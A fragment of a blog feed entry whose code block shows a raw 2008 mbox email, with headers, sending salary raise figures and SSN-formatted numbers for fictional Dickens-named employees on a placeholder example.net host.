+<span class='line-number'>22</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>From sikes@slax.example.net  Sun Jan 13 23:53:37 2008
+</span><span class='line'>Return-Path: &lt;sikes@slax.example.net>
+</span><span class='line'>Received: from slax.example.net (localhost [127.0.0.1])
+</span><span class='line'>        by slax.example.net (8.13.7/8.13.7) with ESMTP id m0DNlmHb009636
+</span><span class='line'>        for &lt;pirrip@slax.example.net>; Sun, 13 Jan 2008 23:47:48 GMT
+</span><span class='line'>Received: (from sikes@slax.example.net)
+</span><span class='line'>        by slax.example.net (8.13.7/8.13.7/Submit) id m0DNlmDI009635
+</span><span class='line'>        for pirrip; Sun, 13 Jan 2008 23:47:48 GMT
+</span><span class='line'>From: Bill Sikes &lt;sikes@slax.example.net>
+</span><span class='line'>Message-Id: &lt;200801132347.m0DNlmDI009635@slax.example.net>
+</span><span class='line'>Date: Sun, 13 Jan 2008 23:47:48 +0000
+</span><span class='line'>To: pirrip@slax.example.net
+</span><span class='line'>Subject: Raises
+</span><span class='line'>User-Agent: nail 11.25 7/29/05
+</span><span class='line'>MIME-Version: 1.0
+</span><span class='line'>Content-Type: text/plain; charset=us-ascii
+</span><span class='line'>Content-Transfer-Encoding: 7bit
+</span><span class='line'>
+</span><span class='line'>Here's the data for raises for your team:
+</span><span class='line'>Philip Pirrip:  734-67-0424 5.5% $74,224
+</span><span class='line'>Abel Magwitch:  816-03-0028 4.0% $53,122
+</span><span class='line'>Estella Havisham: 762-93-1073 12% $84,325</span></code></pre></td></tr></table></div></figure>
 
 ]]></content>
   </entry>
